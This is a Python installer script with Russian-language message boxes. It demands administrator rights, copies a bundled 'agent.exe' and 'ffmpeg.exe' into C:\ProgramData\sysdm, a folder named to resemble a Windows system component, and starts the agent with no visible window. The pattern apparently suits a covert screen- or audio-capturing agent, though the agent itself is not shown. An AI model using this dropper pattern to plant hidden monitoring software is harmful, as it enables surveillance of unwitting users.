import sys
import os
import shutil
import subprocess
import ctypes
from pathlib import Path

INSTALL_DIR = r"C:\ProgramData\sysdm"


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False


def message_box(title, text, flags=0):
    ctypes.windll.user32.MessageBoxW(None, text, title, flags)


def main():
    if not is_admin():
        message_box(
            "Ошибка",
            "Установка должна быть запущена от имени администратора.\n"
            "Нажмите правой кнопкой → Запуск от имени администратора.",
            0x10,
        )
        sys.exit(1)

    try:
        Path(INSTALL_DIR).mkdir(parents=True, exist_ok=True)
    except Exception as e:
        message_box("Ошибка", f"Не удалось создать {INSTALL_DIR}:\n{e}", 0x10)
        sys.exit(1)

    meipass = getattr(sys, "_MEIPASS", os.path.dirname(sys.executable))

    agent_src = os.path.join(meipass, "agent.exe")
    ffmpeg_src = os.path.join(meipass, "ffmpeg.exe")
    agent_dst = os.path.join(INSTALL_DIR, os.path.basename(agent_src))

    agent_name = os.path.basename(agent_src)

    for src, name in [(agent_src, agent_name), (ffmpeg_src, "ffmpeg.exe")]:
        dst = os.path.join(INSTALL_DIR, name)
        try:
            shutil.copy2(src, dst)
        except Exception as e:
            message_box("Ошибка", f"Не удалось скопировать {name}:\n{e}", 0x10)
            sys.exit(1)

    try:
        proc = subprocess.Popen(
            [agent_dst],
            cwd=INSTALL_DIR,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
    except Exception as e:
        message_box("Ошибка", f"Не удалось запустить агента:\n{e}", 0x10)
        sys.exit(1)

    message_box(
        "Установка завершена",
        f"Агент {agent_name} установлен в {INSTALL_DIR}\n"
        f"и запущен (PID={proc.pid}).\n\n"
        f"Агент будет автоматически работать как служба.",
        0x40,
    )


if __name__ == "__main__":
    main()
